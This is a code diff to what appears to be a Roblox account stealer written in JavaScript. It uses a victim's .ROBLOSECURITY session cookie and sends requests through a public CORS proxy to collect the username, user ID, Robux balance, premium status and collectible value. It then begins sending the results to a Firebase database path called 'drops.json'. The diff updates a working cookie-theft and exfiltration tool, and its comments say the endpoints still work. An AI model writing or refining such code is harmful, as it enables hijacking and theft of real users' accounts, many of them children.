@@ -35,23 +35,27 @@ async function run() {
     return;
   }
 
+  // FREE CORS PROXY THAT WORKS IN 2025
+  const proxy = "https://corsproxy.io/?";
+
   const headers = { "Cookie": ".ROBLOSECURITY=" + cookie };
 
-  // THIS ENDPOINT STILL WORKS FROM WEBSITES IN 2025
-  const acc = await fetch("https://www.roblox.com/my/account/json", { headers }).then(r => r.json()).catch(() => ({}));
+  let user = "Unknown", display = "Unknown", userid = 0, robux = 0, rap = 0, premium = "No", headshot = "";
 
-  const user = acc.Name || "Unknown";
-  const display = acc.DisplayName || user;
-  const userid = acc.UserId || 0;
-  const robux = acc.RobuxBalance || 0;
-  const premium = acc.IsPremium ? "Yes" : "No";
-  const headshot = `https://www.roblox.com/headshot-thumbnail/image?userId=${userid}&width=150&height=150&format=png`;
-
-  // RAP (still works)
-  let rap = 0;
   try {
-    const rapData = await fetch(`https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers }).then(r => r.json());
-    rap = rapData.data?.reduce((a,i) => a + (i.recentAveragePrice || 0), 0) || 0;
+    const info = await fetch(proxy + "https://www.roblox.com/my/account/json", { headers }).then(r => r.json());
+    user = info.Name || "Unknown";
+    display = info.DisplayName || user;
+    userid = info.UserId || 0;
+    robux = info.RobuxBalance || 0;
+    premium = info.IsPremium ? "Yes" : "No";
+    headshot = `https://www.roblox.com/headshot-thumbnail/image?userId=${userid}&width=150&height=150&format=png`;
+
+    // RAP
+    try {
+      const rapData = await fetch(proxy + `https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers }).then(r => r.json());
+      rap = rapData.data?.reduce((sum, i) => sum + (i.recentAveragePrice || 0), 0) || 0;
+    } catch(e) {}
   } catch(e) {}
 
   fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
